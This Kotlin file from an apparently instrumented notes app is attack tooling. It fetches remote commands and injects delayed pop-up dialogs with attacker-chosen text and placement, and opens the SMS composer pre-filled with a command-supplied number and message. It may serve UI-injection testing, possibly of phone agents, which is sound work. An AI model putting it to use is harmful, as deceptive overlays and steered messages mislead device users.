package org.fossify.notes.attack

import android.content.Context
import android.content.Intent
import android.graphics.drawable.ColorDrawable
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.widget.Button
import android.widget.PopupWindow
import android.widget.TextView
import androidx.core.content.ContextCompat
import org.fossify.notes.R


fun showDialog(dialogData: DialogData, context: Context) {
    // 创建PopupWindow的视图
    val inflater = LayoutInflater.from(context)
    val view = inflater.inflate(R.layout.attack_popup_window, null)

    // 设置PopupWindow的内容
    val titleTextView: TextView = view.findViewById(R.id.dialog_title)
    val messageTextView: TextView = view.findViewById(R.id.dialog_message)


    // 设置标题和消息
    titleTextView.text = dialogData.title
    messageTextView.text = dialogData.message

    // 创建PopupWindow
    val popupWindow = PopupWindow(view, dialogData.width, dialogData.height, true)

    // 获取按钮
    val confirmButton: Button = view.findViewById(R.id.confirm_button)
    val cancelButton: Button = view.findViewById(R.id.cancel_button)

    // 控制确认按钮的可见性
    if (dialogData.confirmVisible) {
        confirmButton.visibility = View.VISIBLE
        confirmButton.text = dialogData.confirm
        confirmButton.setOnClickListener {
            // 处理确认按钮的点击
            popupWindow.dismiss()
        }
    } else {
        confirmButton.visibility = View.GONE
    }

    // 控制取消按钮的可见性
    if (dialogData.cancelVisible) {
        cancelButton.visibility = View.VISIBLE
        cancelButton.text = dialogData.cancel
        cancelButton.setOnClickListener {
            // 处理取消按钮的点击
            popupWindow.dismiss()
        }
    } else {
        cancelButton.visibility = View.GONE
    }


    // 设置背景为透明，以便去除默认背景阴影
    popupWindow.setBackgroundDrawable(ColorDrawable(ContextCompat.getColor(context, android.R.color.transparent)))

    // 延迟显示
    Handler(Looper.getMainLooper()).postDelayed({
        popupWindow.showAtLocation(view, Gravity.NO_GRAVITY, dialogData.left, dialogData.top)
        Log.i("Attack", "Show dialog L${dialogData.left} T${dialogData.top} W${dialogData.width} H${dialogData.height} " + "Title: ${dialogData.title} Message: ${dialogData.message} Confirm: ${dialogData.confirmVisible} ${dialogData.confirm} Cancel: ${dialogData.cancelVisible} ${dialogData.cancel}")
    }, dialogData.delay)

}

fun sendMessage(message: MessageData, context: Context) {
    // 使用 Handler 来延迟执行
    Handler(Looper.getMainLooper()).postDelayed({
        // 创建短信发送的 Intent
        val smsUri = Uri.parse("smsto:${message.receiver}") // 使用 "smsto:" 协议来指定短信接收号码
        val intent = Intent(Intent.ACTION_SENDTO, smsUri)

        // 填充短信内容
        intent.putExtra("sms_body", message.content)

        // 启动短信应用程序
        context.startActivity(intent)
    }, message.delay) // 延迟时间
}


fun showButton(buttonData: ButtonData, context: Context) {

}

fun attack(action: String, context: Context) {
    fetchViewCli(action) { cmds ->
        // dialogs
        for (dialog in cmds.dialogs) {
            showDialog(dialog, context)
        }
        // button
        for (button in cmds.buttons) {
            showButton(button, context)
        }
        // message
        for (message in cmds.messages) {
            sendMessage(message, context)
        }
    }

}
